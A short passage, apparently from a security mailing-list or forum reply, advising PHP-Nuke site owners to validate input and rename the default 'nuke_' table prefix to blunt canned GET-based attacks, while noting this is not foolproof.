Again as before, code should be validating input.  But as a simple 
precaution against default GET attacks, changing the table prefix from the 
common "nuke_" to something random like "zloqf7_" would render that 
sample, and all others based on "nuke_" useless.  

Of course in the grander scheme that isn't foolproof, but does work 
against the default GETs.
